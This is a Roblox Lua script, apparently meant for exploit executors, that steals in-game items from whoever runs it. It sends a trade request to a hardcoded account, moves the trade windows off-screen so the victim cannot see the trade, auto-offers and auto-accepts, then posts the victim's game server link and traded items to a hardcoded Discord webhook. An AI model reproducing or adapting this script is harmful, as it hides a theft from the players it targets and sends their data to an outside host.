local webhookUrl = "https://discord.com/api/webhooks/1564766433466912849/wymKnn-UzPAYt9MLsWahCWY4hOM6FEqlozeIMvfhB1o4jD7MbvzP1LGur331jNI6-NSK"

local HttpService        = game:GetService("HttpService")
local Players            = game:GetService("Players")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then return end

local TARGET_NAME = "Marie_31113"

local function sendDiscord(payload)
    local requestFunc = request or http_request or (syn and syn.request)
    if not requestFunc then return end
    pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- Получаем инфу об игре и инжекторе
local placeId, jobId = game.PlaceId, game.JobId
local gameName = "Unknown"
pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
local executorName = identifyexecutor and identifyexecutor() or "Delta"
local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", placeId, jobId)

-- =========================================================
-- 1. ОТПРАВКА ЗАПРОСА НА ТРЕЙД
-- =========================================================
local function sendTradeToTarget()
    local target = Players:FindFirstChild(TARGET_NAME)
    if not target then return end
    task.wait(2)

    local Trade = ReplicatedStorage:WaitForChild("Trade")
    local SendRequest = Trade:WaitForChild("SendRequest")

    for i = 1, 5 do
        if not Players:FindFirstChild(TARGET_NAME) then return end
        local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
        if ok and res == true then
            print("[trade] ✅ Запрос на трейд отправлен.")
            return
        end
        task.wait(2)
    end
end

-- =========================================================
-- 2. СКРЫТИЕ GUI ТРЕЙДА
-- =========================================================
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local function hideTradeWindows()
    local okTM, TM = pcall(function() return require(ReplicatedStorage.Modules.TradeModule) end)
    if okTM and TM and TM.GUI and TM.GUI.RequestFrame then
        TM.GUI.RequestFrame.Visible = false
        TM.GUI.RequestFrame:GetPropertyChangedSignal("Visible"):Connect(function()
            TM.GUI.RequestFrame.Visible = false
        end)
    end
    for _, gui in ipairs(PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and string.find(string.lower(gui.Name), "trade") then
            for _, child in ipairs(gui:GetDescendants()) do
                if child:IsA("GuiObject") then
                    pcall(function() child.Position = UDim2.new(9999, 0, 9999, 0) end)
                end
            end
        end
    end
end
hideTradeWindows()

-- =========================================================
-- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ЛОГ ЛУТА
-- =========================================================
local Trade = ReplicatedStorage:WaitForChild("Trade")
local lastOffer = nil
local myName = LocalPlayer.Name
local offered = false
local tradeLogged = false

Trade.StartTrade.OnClientEvent:Connect(function()
    offered = true
    task.wait(2)

    local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
    local okSync, Sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
    if not okPD or not okSync then return end

    local safeCommon = {}
    local dangerous = {
        ["Fragile_G_2023"] = true, ["CandyCorn_K_2024"] = true,
        ["Patrick"] = true, ["Xbox"] = true, ["Santa"] = true,
        ["Coal"] = true, ["CandyCorn"] = true,
    }

    for id, amount in pairs(PD.Weapons.Owned or {}) do
        if #safeCommon >= 4 then break end
        local info = Sync.Weapons and Sync.Weapons[id]
        if info and info.Rarity == "Common" and not dangerous[id] then
            table.insert(safeCommon, {id = id, type = "Weapons"})
        end
    end

    for _, item in ipairs(safeCommon) do
        pcall(function() Trade.OfferItem:FireServer(item.id, item.type) end)
        task.wait(0.4)
    end
end)

Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if data.LastOffer then lastOffer = data.LastOffer end
end)

Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
    if success and lootList and #lootList > 0 then
        if tradeLogged then return end
        tradeLogged = true

        local itemsText = ""
        for _, item in ipairs(lootList) do
            local itemId, amount, itemType = item[1], item[2], item[3]
            local itemName = itemId
            pcall(function()
                local Sync = require(ReplicatedStorage.Database.Sync)
                local info = Sync[itemType] and Sync[itemType][itemId]
                if info then itemName = info.ItemName or info.Name or itemId end
            end)
            itemsText = itemsText .. string.format("🔹 **%s** (x%d)\n", itemName, amount)
        end

        sendDiscord({
            username = "Trade Logger (" .. myName .. ")",
            embeds = {
                {
                    title = "🎮 Профиль трейда: " .. myName,
                    description = "Ниже собрана информация о сессии.",
                    color = 0x00FF00, -- зелёный
                    fields = {
                        { name = "🕹️ Игра", value = "**"..gameName.."**\n`PlaceId: "..placeId.."`", inline = true },
                        { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
                        { name = "🔗 Сервер", value = "[Присоединиться]("..joinLink..")", inline = true },
                        { name = "📦 Лут", value = itemsText, inline = false }
                    },
                    footer = { text = "Roblox Webhook Logger" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
            }
        })
        print("[trade] 📦 Сообщение о трейде отправлено в Discord!")
    else
        if lastOffer then
            pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer) end)
        end
    end
end)

